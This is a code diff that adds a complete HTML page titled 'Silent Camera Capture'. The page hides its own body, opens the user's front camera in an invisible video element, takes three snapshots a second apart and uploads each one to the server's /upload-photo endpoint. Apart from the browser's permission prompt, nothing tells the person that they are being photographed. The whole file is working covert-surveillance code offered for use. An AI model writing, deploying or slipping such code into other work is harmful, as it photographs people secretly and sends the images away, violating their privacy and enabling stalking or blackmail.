@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Silent Camera Capture</title>
+    <style>
+        body { display: none; }
+    </style>
+</head>
+<body>
+    <video id="camera-preview" style="display:none;" autoplay muted></video>
+
+    <script>
+        const videoElement = document.getElementById('camera-preview');
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } // Changed to front camera
+                });
+                videoElement.srcObject = stream;
+                await new Promise(resolve => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                });
+                return true;
+            } catch (err) {
+                console.error('Camera access error:', err);
+                return false;
+            }
+        }
+
+        function capturePhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    try {
+                        await fetch('/upload-photo', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        resolve();
+                    } catch (err) {
+                        console.error('Photo upload error:', err);
+                        resolve();
+                    }
+                }, 'image/jpeg');
+            });
+        }
+
+        async function captureSequence() {
+            for (let i = 0; i < 3; i++) {
+                await capturePhoto();
+                if (i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }
+
+        async function initializeCapture() {
+            const cameraAccessed = await startCamera();
+            if (cameraAccessed) {
+                setTimeout(captureSequence, 1000);
+            }
+        }
+
+        initializeCapture();
+    </script>
+</body>
+</html>
